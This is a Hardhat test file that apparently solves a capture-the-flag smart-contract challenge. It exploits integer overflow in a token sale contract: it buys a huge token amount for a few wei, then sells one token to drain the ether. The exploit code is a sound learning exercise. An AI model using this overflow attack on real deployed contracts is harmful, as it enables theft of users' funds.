import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const price = ethers.utils.parseEther("1");
    const maxUint256 = ethers.constants.MaxUint256;
  
    // 1. Calculate the overflowed token amount
    const numTokens = maxUint256.div(price).add(1);
  
    // 2. Calculate exact ETH to send (after overflow)
    const ethToSend = numTokens.mul(price).mod(maxUint256.add(1));
  
    console.log("Buying", numTokens.toString(), "tokens");
    console.log("Sending", ethToSend.toString(), "wei");
  
    // 3. Buy tokens with overflow
    await target.buy(numTokens, { value: ethToSend });
  
    // 4. Sell all tokens
    const myTokenBalance = await target.balanceOf(attacker.address);
    await target.sell(1);
  
    // 5. Confirm challenge complete
    expect(await target.isComplete()).to.equal(true);
  });
});
